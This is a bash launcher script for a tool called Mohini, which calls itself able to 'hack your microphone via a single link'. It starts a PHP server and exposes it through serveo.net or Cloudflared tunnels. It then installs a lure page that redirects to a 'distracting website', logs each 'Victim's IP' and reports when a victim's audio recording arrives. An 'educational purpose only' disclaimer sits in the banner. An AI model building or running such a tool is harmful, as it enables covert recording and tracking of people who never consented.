#!/bin/bash
# Mohini v1.3
# coded by: github.com/LxaNce-Hacker/Mohini
# Using Recorderjs by: https://github.com/mattdiamond/Recorderjs


__version__="1.3"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='3333'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

trap 'printf "\n"; stop' 2

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

clear
banner() {
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⢶⣾⣿⣿⣾⣝⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠖⣢⣶⣿⣾⣎⣭⡻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀       ${RED}Version : ${CYAN}${__version__}
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⢣⣾⣿⣿⣿⠟⠹⣿⣷⠹⣿⡀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣿⣿⣿⠃⣾⣿⣿⡟⠁⠀⠀⢻⣿⣇⢻⣧⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢀⣠⣾⢱⣿⣿⣿⢸⣿⣿⣿⠁⢀⣠⠤⠤⣿⣿⡘⣿⣇⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠈⠉⠉⣡⣿⣿⣿⠇⣾⣿⣿⠇⠀⢀⣴⣶⣶⠊⢿⣧⢻⣿⡄⠀⠀⠀⠀⠀       ${RED}Hi 👋,
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢠⣾⣿⡿⠟⣡⣾⣿⣿⡟⠀⠀⠀⠉⠉⠀⠀⣀⡻⣷⡹⣿⣦⣤⠀⠀⠀       ${RED}I am Mohini,
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⢸⡏⣴⠿⠿⡿⠿⢟⣫⡏⠐⠶⠆⠀⠀⠀⣸⣿⢹⣝⢿⣶.⠀⠀⠀⠀       ${RED}I can hack your microphone via a single link...
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⣸⢻⡏⣾⣿⣿⣿⢿⡋⠀⢉⣉⡝⠀⠀⣰⣿⣿⡏⣿⣷⠻⣷⣄⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠠⠤⠞⣡⣿⣿⣿⢟⠸⣿⣦⣀⠀⢀⣠⡞⢻⣿⣿⣷⠘⢿⡄⠀⠉⠛⠒⠂       ${RED}Current Version : ${CYAN}${__version__}
    echo -e ${GREEN}⠀⠀⠀⠀⠀⢀⣠⣾⠿⢟⣫⡶⢫⠀⣿⡿⢿⣿⡿⠋⢠⣾⣿⣿⣿⡟⣮⠻⢤⣀⠀⠀⠀       ${RED}Supported : ${CYAN}Linux, Termux
    echo -e ${GREEN}⠀⠀⠀⠐⠋⠉⣱⢸⣿⣿⠏⣴⣿⡇⢸⣇⠀⠉⠁⢀⣿⡿⢿⣿⣿⡇⢹⣷⡀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⢀⣼⡇⢸⣿⡏⣼⣿⣿⡇⢸⣿⡄⠀⢀⡿⠁⠀⢸⣿⣿⡇⣼⣿⣷⠀⠀⠀⠀       ${RED}Developed by : ${CYAN}LxaNce-Hacker
    echo -e ${GREEN}⠀⠀⠀⢠⣿⣿⠇⢸⣿⡇⣿⣿⣿⡇⢸⡏⡇⠀⢸⠁⠀⢀⣾⣿⢟⣼⣿⠟⣫⡇⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⢸⣿⠃⣠⣾⣿⢀⣿⣿⣿⡇⡼⠀⣷⠀⣾⠀⢠⣾⡿⢣⣿⣿⣷⡙⢿⣷⡀⠀⠀
    echo -e ${GREEN}⠀⢀⣀⣾⣧⣾⣿⢿⣣⣾⣿⢿⣫⠆⠁⠀⡇⠀⢹⡀⠈⣿⣇⠈⠻⢿⣿⣿⣶⣹⣷⠀⠀       ${CYAN}NOTE:-
    echo -e ${GREEN}⠀⠀⠉⢱⣿⡏⣾⣿⢟⣫⣾⡟⠁⠀⠀⢰⣧⣄⣼⡇⠀⠸⣿⡀⠀⠀⢈⣿⣿⢻⡟⠀⠀       ${RED}This Tool is made for educational purpose only,
    echo -e ${GREEN}⢀⠀⠀⠀⣿⣧⢻⣿⡸⣿⣿⠀⠀⠀⠀⡸⠈⢿⠋⠹⡄⠀⣿⠇⠀⣴⣿⠟⠉⡿⠀⠀⠀       ${RED}Author will not be responsible for any misuse
    echo -e ${GREEN}⠙⠦⠤⣤⠾⢟⣤⡹⣿⣮⡻⣧⡀⠀⢀⡇⠀⠈⠀⠀⠙⣶⣿⠀⠀⠘⣿⡀⠘⠷⠄⠀⠀       ${RED}of this toolkit.
    echo -e ${GREEN}⠀⠀⠀⠀⣠⣿⣿⠿⠼⣿⣷⢼⠇⠀⡼⠀⠀⠀⠐⠒⠚⠛⠁⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⣿⡟⠀⠀⢠⣿⡿⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠛⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⣸⠟⠀⠀⣰⡿⠋⠀⠀⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠒⠚⠉⠀⠀⠀⣟⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi

  if [[ $checkcloudflared == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi

  exit 1
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

## Download
download() {
	curl --progress-bar --create-dirs -L "$1" -o ".server/$2"
}

## Start PHP server
start_php() {
	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Starting php server...(localhost:$PORT)"
	fuser -k $PORT/tcp > /dev/null 2>&1
	php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
	sleep 2
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner; cusport; }
		fi
	else
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

start_cloudflared() {
	mkdir -p .server
	rm .server/.cld.log > /dev/null 2>&1
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	start_php
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	# Check if Cloudflared is installed
	if command -v cloudflared > /dev/null 2>&1; then
		# If installed, use the system Cloudflared
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared package detected. Using system Cloudflared..."
		cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	elif [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "http://$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	echo -e "\n\n${RED}[${WHITE}*${RED}]${GREEN} Waiting for Cloudflared link..."
	while true; do
		if [[ -e ".server/.cld.log" ]]; then
			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -n1)
			if [[ -n "$cldflr_url" ]]; then
				break
			fi
		fi
		sleep 1
	done
	echo "$cldflr_url" > sendlink
	custom_url "$cldflr_url"
}

custom_url() {
	echo -e "${RED}[${WHITE}+${RED}]${GREEN} Direct link : ${BLUE}$1"
	payload
	checkfound
}


catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Victim's IP : ${BLUE}$ip"
  cat ip.txt >> saved.ip.txt
}

checkfound() {
  printf "\n"
  echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Waiting targets, Press Ctrl+C to exit..."

  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
      echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Target opened the link!\n"
      catch_ip
      rm -rf ip.txt
    fi

    sleep 0.5

    if [[ -e "Log.log" ]]; then
      echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Audio file received!\n"
      rm -rf Log.log
    fi

    sleep 0.5
  done
}

# Check for a newer release
check_update(){
	echo -ne "${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	relase_url='https://api.github.com/repos/LxaNce-Hacker/Mohini/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/LxaNce-Hacker/Mohini/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}update found\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
		pushd "$HOME" > /dev/null 2>&1
		wget "${tarball_url}" -O ".Mohini.tar.gz" 2>/dev/null

		if [[ -e ".Mohini.tar.gz" ]]; then
			tar -xf .Mohini.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
			rm -f .Mohini.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run Mohini again\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep 1 ; clear
	fi
}

## Check Internet Status
check_status() {
    banner;
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	if [ $? -ne 0 ]; then
		echo -e "${RED}Offline${WHITE}\n"
		read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Continue Without Internet ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
		if [[ ${P_ANS} =~ ^([yY])$ ]]; then
			echo -e "\n"
		else
			echo -ne "\n\n${RED}[${WHITE}👋${RED}]${BLUE} Bye !!! ${WHITE}\n"
			exit 1
		fi
	else
		echo -e "${GREEN}Online${WHITE}"
		check_update
	fi
}

server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Serveo..."

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $subdomain_resp == true ]]; then
    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $subdomain:80:localhost:$PORT serveo.net > sendlink 2>&1" &
    sleep 8
  else
    $(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT serveo.net > sendlink 2>&1" &
    sleep 8
  fi

  start_php
  sleep 3
  send_link=$(grep -o 'https://[a-zA-Z0-9.-]*serveo[a-zA-Z0-9.-]*' sendlink | head -n1)
  custom_url "$send_link"
}

start1() {
  if [[ -e sendlink ]]; then
    rm -rf sendlink
  fi

  printf "\n"
  echo -e "\n${RED}[${WHITE}01${RED}]${GREEN} Serveo.net"
  echo -e "${RED}[${WHITE}02${RED}]${GREEN} Cloudflared"
  echo -e "${RED}[${WHITE}03${RED}]${GREEN} Coming Soon...\n"
  default_option_server="1"
  read -p "${RED}[${WHITE}+${RED}]${ORANGE} Choose a port forwarding option :${BLUE} " option_server
  option_server="${option_server:-${default_option_server}}"

  default_redirect="https://lxance.xyz"
  read -p "${RED}[${WHITE}+${RED}]${GREEN} Choose a distracting website (Default: ${BLUE}$default_redirect${GREEN}) : ${BLUE}" redirect_link
  redirect_link="${redirect_link:-${default_redirect}}"

  if [[ $option_server -eq 1 ]]; then
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    start
  elif [[ $option_server -eq 2 ]]; then
    install_cloudflared
    start_cloudflared
  elif [[ $option_server -eq 3 ]]; then
    comming_soon
  else
    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Invalid option!"
    sleep 1
    clear
    start1
  fi
}

payload() {
  cp template.php index.php
  sed "s+redirect_link+$redirect_link+g" js/_app.js > js/app.js
}

comming_soon() {
    echo -e "\n comming_soon..."
    exit
}
start() {
  default_choose_sub="Y"
  default_subdomain="lxance$RANDOM"

  read -p "${RED}[${WHITE}+${RED}]${GREEN} Choose subdomain? [Y/N] : " choose_sub
  choose_sub="${choose_sub:-${default_choose_sub}}"

  if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
    subdomain_resp=true
    read -p "${RED}[${WHITE}+${RED}]${GREEN} Subdomain (Default: ${BLUE}$default_subdomain${GREEN}) : ${BLUE}" subdomain
    subdomain="${subdomain:-${default_subdomain}}"
  fi

  server
}

check_status
banner
dependencies
start1
